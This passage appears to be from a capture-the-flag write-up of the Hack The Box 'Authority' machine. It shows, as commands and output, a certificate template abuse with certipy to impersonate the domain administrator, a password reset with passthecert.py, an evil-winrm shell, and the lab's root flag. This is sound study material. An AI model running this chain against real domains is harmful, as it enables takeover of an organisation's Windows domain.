+</p><p id="fef34df8-5239-41f4-b256-78f4bc159e08" class="">Now this one worked finally</p><p id="df1137ec-7909-4199-a9ed-0a87e167fe71" class=""><code>certipy req -target authority.htb -u DAM$ -p &#x27;P@ssword&#x27; -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6251a10a-d958-4714-87eb-4d9409560151" class="code"><code class="language-Rust">(cert)─(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ certipy req -target authority.htb -u DAM$ -p &#x27;P@ssword&#x27; -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 4
+[*] Got certificate with UPN &#x27;administrator@authority.htb&#x27;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</code></pre><p id="bb87c6a3-04ba-4324-b2d4-b5da1bf03300" class="">
+</p><p id="5e08d949-d733-4cb2-b9d4-0d62bb684810" class="">Extraxct from the pfx</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="adb13627-427b-460b-b524-780e809fbf02" class="code"><code class="language-Rust">ertipy cert -pfx administrator.pfx -nokey -out administrator.crt
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Writing certificate and  to &#x27;administrator.crt&#x27;</code></pre><p id="9877ce83-e4a1-4077-a477-4aebdf98966b" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0b880c44-359a-494e-a91f-b4e593e00264" class="code"><code class="language-Rust">ertipy cert -pfx administrator.pfx -nocert -out administrator.key
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Writing certificate and  to &#x27;administrator.key&#x27;</code></pre><p id="90cf40d2-400f-46af-82f0-1b553d08510f" class="">
+</p><p id="95389ab0-b4ba-474a-a6b3-aa37818ca4eb" class="">Lets try to authenticate finally using passthecert.py</p><p id="5860f382-d1b7-4d5d-b9ec-82e416621458" class="">Changing the admin pass:</p><p id="55fafda1-bd8f-43d7-aee2-52e60380f32a" class=""><code>python3 passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56 -target administrator -new-pass</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7eb11b50-51e9-4a44-9038-18169d369b55" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ python3 passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56 -target administrator -new-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Successfully changed administrator password to: rWdo13sZMzPgggBXeerJhJUGgRv0kAan</code></pre><p id="9c2927ac-0f04-4557-8563-3c3d8b90cbbe" class="">
+</p><p id="df1640e7-4845-4a55-be41-ad711ae054f0" class="">Using win-rm</p><p id="f37a6bf1-8232-4b01-ae2a-f7b12b5d8f01" class=""><code> evil-winrm -i 10.129.229.56 -u administrator</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="94f83f2e-a2b7-4694-9dfa-332d5c170220" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ evil-winrm -i 10.129.229.56 -u administrator
+Enter Password: 
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                               
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                 
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+htb\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p id="71fdfd8c-5625-4b65-a957-bc74dc6f6fe4" class="">
+</p><p id="1a977e9f-1b7d-4fda-96ef-d831ccdf8659" class="">Root flag:</p><p id="075f9297-d9da-4184-905e-15d82d48cf74" class=""><mark class="highlight-teal">root: cc7dc1150064b0558b8ea46f0c778bb5</mark></p><p id="7d928a7f-5812-4945-ab70-af8e945a1387" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
